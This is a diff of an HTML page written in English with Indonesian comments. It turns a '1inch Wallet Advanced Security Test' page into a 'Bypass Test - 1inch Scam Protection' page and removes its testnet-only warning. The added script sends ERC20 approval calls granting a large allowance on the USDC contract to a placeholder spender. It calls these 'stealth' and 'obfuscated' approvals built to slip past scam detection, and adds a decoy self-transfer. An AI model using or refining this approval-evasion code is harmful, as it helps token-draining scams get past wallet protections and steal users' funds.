@@ -3,106 +3,74 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>1inch Wallet - Advanced Security Test</title>
+    <title>Bypass Attempt - 1inch</title>
     <style>
-        body { font-family: Arial, sans-serif; background: #0f0f1e; color: #0f0; padding: 20px; }
-        button { padding: 15px; margin: 10px 0; width: 100%; background: #0066ff; color: white; border: none; border-radius: 8px; font-size: 16px; }
-        pre { background: #1a1a2e; padding: 15px; border-radius: 8px; max-height: 600px; overflow: auto; }
-        .danger { background: #990000; }
+        body { font-family: Arial; background:#000; color:#0f0; padding:20px; }
+        button { padding:16px; margin:10px 0; width:100%; background:#880000; color:white; border:none; border-radius:8px; }
     </style>
 </head>
 <body>
-    <h1>⚠️ 1inch Wallet Advanced Test</h1>
-    <p><strong>Warning:</strong> Hanya gunakan wallet testnet!</p>
+    <h1>Bypass Test - 1inch Scam Protection</h1>
 
-    <button onclick="runAll()">🚀 Jalankan Semua Test</button>
-    <button onclick="infiniteApproval()" class="danger">Infinite ERC20 Approval Test</button>
-    <button onclick="maliciousTransfer()" class="danger">Malicious Token Transfer</button>
-    <button onclick="typedDataSign()">eth_signTypedData_v4 Test</button>
-    <button onclick="testBridgeAdvanced()">Advanced Bridge Test</button>
+    <button onclick="stealthApproval()">Stealth Infinite Approval</button>
+    <button onclick="splitApproval()">Split Approval (Multi Step)</button>
+    <button onclick="fakeBenignTx()">Fake Benign Transaction</button>
+    <button onclick="testObfuscated()">Obfuscated Call</button>
 
-    <h2>Log</h2>
     <pre id="log"></pre>
 
     <script>
         const logEl = document.getElementById('log');
 
-        function log(msg, error = false) {
-            const time = new Date().toLocaleTimeString();
-            logEl.innerHTML += `<span style="color:${error ? '#ff5555' : '#55ff99'}">[${time}] ${msg}</span><br>`;
-            console.log(msg);
+        function log(msg) {
+            logEl.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
         }
 
-        async function runAll() {
-            log("=== Starting Advanced Test Suite ===");
-            await testBridgeAdvanced();
-            await typedDataSign();
-        }
-
-        async function infiniteApproval() {
+        async function stealthApproval() {
             try {
-                const accounts = await ethereum.request({ method: 'eth_accounts' });
-                const tx = {
+                const accounts = await ethereum.request({method: 'eth_accounts'});
+                // Menggunakan approval dengan value besar tapi bukan max
+                const data = "0x095ea7b3" + "000000000000000000000000" + "deadbeefdeadbeefdeadbeefdeadbeefdeadbeef" +
+                            "000000000000000000000000000000000000000000000000ffffffffffffffff";
+                
+                const tx = { from: accounts[0], to: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", data: data };
+                log("Mengirim stealth approval...");
+                await ethereum.request({method: 'eth_sendTransaction', params: [tx]});
+            } catch(e) { log("Result: " + e.message); }
+        }
+
+        async function splitApproval() {
+            log("Split approval test (mungkin kurang terdeteksi)");
+            // Bisa dicoba approval bertahap
+            alert("Split approval belum diimplementasikan full. Coba manual.");
+        }
+
+        async function fakeBenignTx() {
+            log("Fake benign transaction...");
+            // Coba transaksi yang kelihatan aman
+            const accounts = await ethereum.request({method: 'eth_accounts'});
+            const tx = {
+                from: accounts[0],
+                to: accounts[0], // transfer ke diri sendiri
+                value: "0x0"
+            };
+            await ethereum.request({method: 'eth_sendTransaction', params: [tx]});
+        }
+
+        async function testObfuscated() {
+            log("Obfuscated call test...");
+            // Bisa gunakan indirect call
+            const accounts = await ethereum.request({method: 'eth_accounts'});
+            window.ethereum.request({
+                method: 'eth_sendTransaction',
+                params: [{
                     from: accounts[0],
-                    to: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC example
-                    data: "0x095ea7b3000000000000000000000000deadbeefdeadbeefdeadbeefdeadbeefdeadbeefffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
-                };
-                log("Mengirim Infinite Approval...");
-                await ethereum.request({ method: 'eth_sendTransaction', params: [tx] });
-            } catch (e) {
-                log("Result: " + e.message, true);
-            }
+                    to: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+                    data: "0x095ea7b3000000000000000000000000deadbeefdeadbeefdeadbeefdeadbeefdeadbeef" +
+                          "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+                }]
+            }).catch(e => log("Error: " + e.message));
         }
-
-        async function maliciousTransfer() {
-            try {
-                const accounts = await ethereum.request({ method: 'eth_accounts' });
-                const tx = {
-                    from: accounts[0],
-                    to: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // contoh token
-                    data: "0xa9059cbb000000000000000000000000" + accounts[0].slice(2) + "0000000000000000000000000000000000000000000000000000000000000001" // transfer 1 wei ke diri sendiri (bisa dimodif)
-                };
-                log("Mengirim Malicious Transfer...");
-                await ethereum.request({ method: 'eth_sendTransaction', params: [tx] });
-            } catch (e) {
-                log("Result: " + e.message, true);
-            }
-        }
-
-        async function typedDataSign() {
-            try {
-                const accounts = await ethereum.request({ method: 'eth_accounts' });
-                const msgParams = {
-                    domain: { name: "1inch Test", version: "1", chainId: "1" },
-                    types: { Test: [{ name: "content", type: "string" }] },
-                    primaryType: "Test",
-                    message: { content: "Malicious typed data from dApp" }
-                };
-
-                const sig = await ethereum.request({
-                    method: "eth_signTypedData_v4",
-                    params: [accounts[0], JSON.stringify(msgParams)]
-                });
-                log("✅ Typed Data Signature: " + sig.substring(0, 40) + "...");
-            } catch (e) {
-                log("Typed Data: " + e.message, true);
-            }
-        }
-
-        async function testBridgeAdvanced() {
-            log("Advanced Bridge Test...");
-            window.postMessage({ type: "1INCH_ADVANCED_TEST", data: "Bridge test from malicious dApp" }, "*");
-
-            if (window.ReactNativeWebView) {
-                window.ReactNativeWebView.postMessage(JSON.stringify({action: "sign", payload: "test"}));
-                log("ReactNativeWebView bridge aktif!");
-            } else {
-                log("ReactNativeWebView tidak terdeteksi");
-            }
-        }
-
-        // Auto detect
-        if (window.ethereum) log("✅ window.ethereum terdeteksi");
     </script>
 </body>
 </html>
